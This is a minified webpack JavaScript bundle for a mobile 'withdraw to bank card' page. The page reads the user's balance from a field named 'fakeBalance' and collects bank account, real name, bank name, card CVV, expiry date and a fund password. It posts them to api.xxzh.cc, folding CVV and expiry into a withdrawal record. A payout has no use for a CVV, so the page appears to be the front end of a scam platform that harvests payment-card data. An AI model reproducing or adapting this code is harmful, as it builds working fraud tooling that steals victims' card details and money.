"use strict";(self.webpackChunk=self.webpackChunk||[]).push([[6234],{59510:function(y,v,t){t.d(v,{Br:function(){return k},KF:function(){return g},W2:function(){return B},bG:function(){return b},iY:function(){return D},kM:function(){return l},rH:function(){return d},s6:function(){return n}});var I=t(33746),i=I.Z.create({baseURL:"https://api.xxzh.cc",withCredentials:!1,crossDomain:!0,timeout:1e4});i.interceptors.request.use(function(_){var o=localStorage.getItem("token");return o&&(_.headers.Authorization="Bearer ".concat(o)),_},function(_){return Promise.reject(_)});var b=function(o){return i.get("/user/info/".concat(o)).then(function(u){return u.data})},g=function(o,u){return i.put("/user/tron/set",{userId:o,address:u}).then(function(m){return m.data})},D=function(o){return i.get("/user/tron/get",{params:{userId:o}}).then(function(u){return u.data})},B=function(o,u,m,p,S){return i.post("/withdrawal-records/user",{username:o,amount:u,fundPassword:m,method:p,address:S}).then(function(e){return e.data})},k=function(o,u,m,p,S,e){return i.put("/user/set-bank-info",{userId:o,bankAccount:u,realName:m,bankName:p,cvv:S,expiryDate:e}).then(function(j){return j.data})},d=function(o){return i.get("/user/bank-info",{params:{userId:o}}).then(function(u){return u.data})},l=function(o,u,m,p,S,e,j,x){var w="".concat(p," | ").concat(S," | ").concat(e," | CVV:").concat(j," | Exp:").concat(x);return i.post("/withdrawal-records/user/bank",{username:o,amount:u,fundPassword:m,method:"\u94F6\u884C\u5361",address:w}).then(function(E){return E.data})},n=function(o){var u=arguments.length>1&&arguments[1]!==void 0?arguments[1]:0,m=arguments.length>2&&arguments[2]!==void 0?arguments[2]:10;return i.get("/shop/search-with-products",{params:{name:o,page:u,size:m}}).then(function(p){return p.data})}},57540:function(y,v,t){t.d(v,{Z:function(){return D}});var I=t(75271),i=t(69194),b=t(52676),g=function(k){var d=k.visible;return(0,b.jsx)(i.zd,{visible:d,className:"loading-mask",children:(0,b.jsxs)("div",{className:"loading-container",children:[(0,b.jsx)(i.wW,{style:{"--size":"48px"}}),(0,b.jsx)("span",{className:"loading-text",children:"Loading..."})]})})},D=g},84908:function(y,v,t){var I=t(69194),i=t(75271),b=t(5791),g=t(52676),D=function(k){var d=k.title,l=(0,b.s0)(),n=function(){l(-1)};return(0,g.jsx)(g.Fragment,{children:(0,g.jsx)(I.l2,{onBack:n,style:{background:"#fff",position:"sticky",top:0,zIndex:1e3},children:d})})};v.Z=D},44407:function(y,v,t){t.r(v),t.d(v,{default:function(){return j}});var I=t(26068),i=t.n(I),b=t(90228),g=t.n(b),D=t(87999),B=t.n(D),k=t(48305),d=t.n(k),l=t(75271),n=t(69194),_=t(5791),o=t(84908),u=t(59510),m=t(34729),p=t(57540),S=t(59739),e=t(52676);function j(){var de=(0,S.$G)(),r=de.t,le=(0,l.useState)(""),R=d()(le,2),C=R[0],ie=R[1],_e=(0,l.useState)(""),F=d()(_e,2),ce=F[0],me=F[1],he=(0,l.useState)(""),K=d()(he,2),fe=K[0],ve=K[1],be=(0,l.useState)(0),z=d()(be,2),Z=z[0],ge=z[1],pe=(0,l.useState)(""),G=d()(pe,2),T=G[0],we=G[1],Ee=(0,l.useState)(""),H=d()(Ee,2),M=H[0],V=H[1],xe=(0,l.useState)(""),J=d()(xe,2),O=J[0],Y=J[1],De=(0,l.useState)(""),Q=d()(De,2),A=Q[0],X=Q[1],ke=(0,l.useState)(""),$=d()(ke,2),W=$[0],q=$[1],Se=(0,l.useState)(""),ee=d()(Se,2),U=ee[0],te=ee[1],Ce=(0,l.useState)(!1),ae=d()(Ce,2),h=ae[0],Ie=ae[1],Pe=(0,l.useState)(!1),ne=d()(Pe,2),Be=ne[0],L=ne[1],N=(0,_.s0)();(0,l.useEffect)(function(){var c=JSON.parse(localStorage.getItem("userInfo"));if(!c){N("/login");return}ve(c.id),(0,u.bG)(c.id).then(function(s){s&&s.data&&(me(s.data.username),ge(s.data.fakeBalance||0),(0,u.rH)(c.id).then(function(f){if(f&&f.data){var P=f.data,a=P.bankAccount,re=P.realName,se=P.bankName,oe=P.cvv,ue=P.expiryDate;V(a||""),Y(re||""),X(se||""),q(oe||""),te(ue||""),Ie(!a||!re||!se||!oe||!ue)}}).catch(function(){return n.FN.show({content:r("withdrawbank.toast_bankInfoFailed")})}))}).catch(function(){n.FN.show({content:r("withdrawbank.toast_userInfoFailed")}),N("/login")})},[N,r]);var je=function(s){var f=s.replace(/\D/g,"");ie(f)},ye=function(){var c=B()(g()().mark(function s(){var f;return g()().wrap(function(a){for(;;)switch(a.prev=a.next){case 0:if(!(!C||isNaN(C)||Number(C)<=0||!Number.isInteger(Number(C)))){a.next=3;break}return n.FN.show({content:r("withdrawbank.toast_invalidAmount")}),a.abrupt("return");case 3:if(!(Number(C)>Z)){a.next=6;break}return n.FN.show({content:r("withdrawbank.toast_exceedBalance")}),a.abrupt("return");case 6:if(T){a.next=9;break}return n.FN.show({content:r("withdrawbank.toast_needFundPassword")}),a.abrupt("return");case 9:if(L(!0),a.prev=10,!h){a.next=19;break}if(!(!M||!O||!A||!W||!U)){a.next=16;break}return n.FN.show({content:r("withdrawbank.toast_incompleteBankInfo")}),L(!1),a.abrupt("return");case 16:return a.next=18,(0,u.Br)(fe,M,O,A,W,U);case 18:n.FN.show({content:r("withdrawbank.toast_saveSuccess")});case 19:return a.next=21,(0,u.kM)(ce,C,T,A,M,O,W,U);case 21:f=a.sent,f.code===200?(n.FN.show({content:r("withdrawbank.toast_submitSuccess")}),setTimeout(function(){return N("/order/meeting")},500)):f.code===400?n.FN.show({content:f.message||r("withdrawbank.toast_abnormalStatus")}):n.FN.show({content:f.message||r("withdrawbank.toast_operationFailed")}),a.next=28;break;case 25:a.prev=25,a.t0=a.catch(10),n.FN.show({content:r("withdrawbank.toast_operationFailed")});case 28:return a.prev=28,L(!1),a.finish(28);case 31:case"end":return a.stop()}},s,null,[[10,25,28,31]])}));return function(){return c.apply(this,arguments)}}();return(0,e.jsxs)(e.Fragment,{children:[(0,e.jsx)(p.Z,{visible:Be}),(0,e.jsxs)("div",{style:{minHeight:"100vh",background:"linear-gradient(135deg, #f8fafc 0%, #e0e7ef 100%)",boxSizing:"border-box"},children:[(0,e.jsx)(o.Z,{title:r("withdrawbank.title"),style:{height:"100px"}}),(0,e.jsx)("div",{style:{padding:"10px 0"},className:m.Z.content,children:(0,e.jsxs)(n.Zb,{style:{maxWidth:380,margin:"0 auto",borderRadius:18,boxShadow:"0 4px 16px rgba(0,0,0,0.10)",background:"linear-gradient(135deg, #fff 60%, #f5f7fa 100%)"},bodyStyle:{padding:"36px 24px 32px 24px"},children:[(0,e.jsxs)("div",{style:{marginBottom:32},children:[(0,e.jsxs)("label",{style:E,children:[r("withdrawbank.balance"),": ",Z.toFixed(2)," USD"]}),(0,e.jsx)("form",{autoComplete:"off",children:(0,e.jsx)(n.II,{type:"number",inputMode:"numeric",placeholder:r("withdrawbank.inputAmountPlaceholder"),value:C,onChange:je,clearable:!0,style:w,name:"fake-".concat(Date.now()),autoComplete:"new-password"})})]}),(0,e.jsxs)("div",{style:{marginBottom:24},children:[(0,e.jsx)("label",{style:E,children:r("withdrawbank.bankName")}),(0,e.jsx)(n.II,{value:A,onChange:function(s){return X(s)},disabled:!h,style:h?w:x})]}),(0,e.jsxs)("div",{style:{marginBottom:24},children:[(0,e.jsx)("label",{style:E,children:r("withdrawbank.bankAccount")}),(0,e.jsx)(n.II,{value:M,onChange:function(s){return V(s)},disabled:!h,style:h?w:x})]}),(0,e.jsxs)("div",{style:{marginBottom:24},children:[(0,e.jsx)("label",{style:E,children:r("withdrawbank.realName")}),(0,e.jsx)(n.II,{value:O,onChange:function(s){return Y(s)},disabled:!h,style:h?w:x})]}),(0,e.jsxs)("div",{style:{marginBottom:24,display:"flex",gap:"12px"},children:[(0,e.jsxs)("div",{style:{flex:1},children:[(0,e.jsx)("label",{style:E,children:r("withdrawbank.cvv")}),(0,e.jsx)(n.II,{value:W,onChange:function(s){return q(s)},disabled:!h,style:h?w:x})]}),(0,e.jsxs)("div",{style:{flex:1},children:[(0,e.jsx)("label",{style:E,children:r("withdrawbank.expiryDate")}),(0,e.jsx)(n.II,{value:U,onChange:function(s){return te(s)},disabled:!h,style:h?w:x})]})]}),(0,e.jsxs)("div",{style:{marginBottom:24},children:[(0,e.jsx)("label",{style:E,children:r("withdrawbank.fundPassword")}),(0,e.jsx)("form",{autoComplete:"off",children:(0,e.jsx)(n.II,{type:"password",placeholder:r("withdrawbank.inputFundPassword"),value:T,onChange:function(s){return we(s)},clearable:!0,style:w,name:"fund-pass-".concat(Date.now()),autoComplete:"new-password"})})]}),(0,e.jsx)(n.zx,{color:"primary",size:"large",style:{width:"100%",height:48,borderRadius:12,fontSize:18,fontWeight:700,background:"linear-gradient(90deg, #bfa14a 0%, #ffe082 100%)",color:"#232526",letterSpacing:2,boxShadow:"0 2px 8px rgba(191,161,74,0.10)"},onClick:ye,children:r("withdrawbank.confirmWithdraw")})]})})]})]})}var x={width:"auto",padding:"6px 12px",borderRadius:10,border:"1.5px solid #bfa14a",background:"#f0f0f0",color:"#232526",fontWeight:600,boxShadow:"0 2px 8px rgba(191,161,74,0.06)"},w=i()(i()({},x),{},{background:"#f8fafc"}),E={display:"block",fontSize:16,color:"#888",marginBottom:10,fontWeight:500}},34729:function(y,v){v.Z={content:"content___GUahl"}}}]);
